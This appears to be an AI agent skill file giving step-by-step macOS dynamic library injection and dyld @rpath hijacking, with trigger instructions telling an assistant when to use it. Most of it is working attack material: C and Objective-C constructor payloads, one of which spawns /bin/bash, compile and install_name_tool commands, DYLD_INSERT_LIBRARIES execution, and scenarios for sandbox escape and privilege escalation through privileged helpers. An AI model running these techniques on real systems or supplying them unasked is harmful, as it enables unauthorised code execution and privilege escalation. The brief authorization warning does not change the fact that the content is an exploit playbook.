---
name: macos-dyld-hijacking
description: macOS dynamic library injection and dyld hijacking for security testing. Use this skill when analyzing macOS binaries for privilege escalation, checking for disabled library validation, exploiting @rpath vulnerabilities, or performing DYLD_INSERT_LIBRARIES attacks. Trigger when the user mentions macOS security testing, binary analysis, library injection, dyld hijacking, or privilege escalation on macOS systems.
---

# macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES

A skill for performing dynamic library injection attacks on macOS systems during security assessments and privilege escalation scenarios.

## When to Use This Skill

Use this skill when:
- Analyzing macOS binaries for library loading vulnerabilities
- Testing for disabled library validation (com.apple.security.cs.disable-library-validation)
- Exploiting @rpath-based library loading weaknesses
- Performing DYLD_INSERT_LIBRARIES injection attacks
- Conducting macOS privilege escalation assessments
- Investigating binary security configurations

## Prerequisites

- macOS system with appropriate permissions
- Xcode Command Line Tools installed (`xcode-select --install`)
- Target binary or application to analyze
- **Legal authorization** to test the target system

## Safety Warning

> ⚠️ **This skill is for authorized security testing only.** Unauthorized use of these techniques may violate laws and terms of service. Always obtain written permission before testing any system.

## Technique 1: DYLD_INSERT_LIBRARIES Injection

### Basic Injection Example

Create a malicious dynamic library that executes when loaded:

```c
// inject.c
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
    syslog(LOG_ERR, "[+] dylib injected in %s\n", argv[0]);
    printf("[+] dylib injected in %s\n", argv[0]);
    execv("/bin/bash", 0);
}
```

Compile the injection library:
```bash
gcc -dynamiclib -o inject.dylib inject.c
```

Execute the target binary with injection:
```bash
DYLD_INSERT_LIBRARIES=./inject.dylib ./target_binary
```

### Using the Helper Script

```bash
./scripts/create_injection_library.sh --output inject.dylib --action "execv /bin/bash"
```

## Technique 2: Dyld Hijacking via @rpath

### Step 1: Check for Vulnerable Binaries

Use the helper script to analyze a binary:

```bash
./scripts/check_dyld_vulnerability.sh /path/to/binary
```

Or manually check entitlements:
```bash
codesign -dv --entitlements :- "/path/to/binary"
```

Look for `com.apple.security.cs.disable-library-validation` - this indicates the binary doesn't validate loaded library signatures.

### Step 2: Identify @rpath Locations

```bash
# Check where @rpath locations are defined
otool -l "/path/to/binary" | grep LC_RPATH -A 2
```

### Step 3: Find Loaded Libraries

```bash
# Check libraries loaded using @rpath
otool -l "/path/to/binary" | grep "@rpath" -A 3
```

### Step 4: Locate Missing Libraries

```bash
# Find which @rpath libraries actually exist
find /path/to/app -name "libname.dylib"
```

If a library is referenced but doesn't exist in the first @rpath location, it's vulnerable to hijacking.

### Step 5: Create Hijacking Library

Create a library that reexports the legitimate library while executing custom code:

```objectivec
// lib.m
#import <Foundation/Foundation.h>

__attribute__((constructor))
void custom(int argc, const char **argv) {
    NSLog(@"[+] dylib hijacked in %s", argv[0]);
    // Add your payload here
}
```

Compile with matching versions:
```bash
gcc -dynamiclib \
    -current_version 1.0 \
    -compatibility_version 1.0 \
    -framework Foundation \
    /tmp/lib.m \
    -Wl,-reexport_library,"/path/to/legit/lib.dylib" \
    -o "/tmp/lib.dylib"
```

### Step 6: Fix Reexport Path

The reexport path may be relative - convert to absolute:

```bash
# Check current reexport path
otool -l /tmp/lib.dylib | grep REEXPORT -A 2

# Change to absolute path
install_name_tool -change @rpath/lib.dylib \
    "/absolute/path/to/legit/lib.dylib" \
    /tmp/lib.dylib
```

### Step 7: Deploy and Test

```bash
# Copy to hijacked location
cp lib.dylib "/path/to/vulnerable/location/lib.dylib"

# Execute the binary
/path/to/binary
```

## Technique 3: Monitoring Library Loading Events

Monitor when injected libraries are loaded across the system:

```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"'
```

Or use the helper script:
```bash
./scripts/monitor_dyld_events.sh "dylib"
```

## Common Scenarios

### Scenario 1: Testing App Sandbox Escape

1. Identify app with disabled library validation
2. Find @rpath vulnerabilities
3. Create hijacking library with sandbox escape payload
4. Deploy and test

### Scenario 2: Privilege Escalation via Helper Tools

1. Find privileged binaries (setuid, launchd agents)
2. Check for library validation bypass
3. Inject library to spawn privileged shell

### Scenario 3: Malware Analysis

1. Analyze suspicious binaries for @rpath usage
2. Check if they're vulnerable to hijacking
3. Document attack surface

## Verification Checklist

Before attempting injection:

- [ ] Binary has `com.apple.security.cs.disable-library-validation` entitlement
- [ ] Binary uses @rpath for library loading
- [ ] Target library path is writable or can be created
- [ ] Library version numbers match expectations
- [ ] You have authorization to test the target

## Troubleshooting

### Library Not Loading

- Check entitlements again with `codesign -dv --entitlements :-`
- Verify @rpath locations with `otool -l`
- Ensure library versions match (`-current_version` and `-compatibility_version`)
- Check file permissions on the library

### Injection Fails

- DYLD_INSERT_LIBRARIES may be blocked by System Integrity Protection (SIP)
- Some binaries explicitly check for DYLD_INSERT_LIBRARIES
- Try dyld hijacking instead if injection is blocked

### Permission Denied

- You may need to modify the app bundle permissions
- For system binaries, you may need to disable SIP (not recommended for production)

## References

- [CVE-2023-26818 - Telegram TCC Bypass](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- Apple Security Guide - Library Validation
- macOS Code Signing Documentation

## Next Steps

After successful injection:
1. Document the vulnerability with proof of concept
2. Assess impact on system security
3. Recommend remediation (enable library validation, fix @rpath usage)
4. Test remediation effectiveness
